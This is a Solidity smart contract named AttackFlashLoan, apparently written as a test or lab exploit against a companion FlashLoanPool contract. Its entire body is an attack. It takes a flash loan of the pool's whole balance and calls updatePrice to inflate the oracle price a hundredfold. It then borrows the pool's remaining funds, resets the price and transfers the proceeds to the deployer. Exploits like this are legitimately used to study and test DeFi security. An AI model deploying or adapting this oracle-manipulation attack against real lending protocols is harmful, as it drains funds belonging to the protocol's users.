// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./FlashLoanPool.sol";

/**
 * @title AttackFlashLoan
 * @notice Exploits flash loan + price manipulation
 */
contract AttackFlashLoan {
    FlashLoanPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = FlashLoanPool(payable(_pool));
        owner = msg.sender;
    }

    // Step 1: Flash loan to get capital
    function attack() external {
        uint256 poolBalance = address(pool).balance;
        require(poolBalance > 0, "Pool empty");
        
        // Borrow everything
        pool.flashLoan(address(0), poolBalance, address(this));
    }

    // Step 2: After receiving flash loan, manipulate price
    function onFlashLoan() external {
        // Manipulate oracle to make collateral appear more valuable
        pool.updatePrice(100 ether, 1 ether); // 100x price
        
        // Now borrow more than we should be able to
        pool.borrow(address(0), address(pool).balance);
    }

    // Step 3: Restore price and keep profit
    function finalize() external {
        pool.updatePrice(1 ether, 1 ether);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
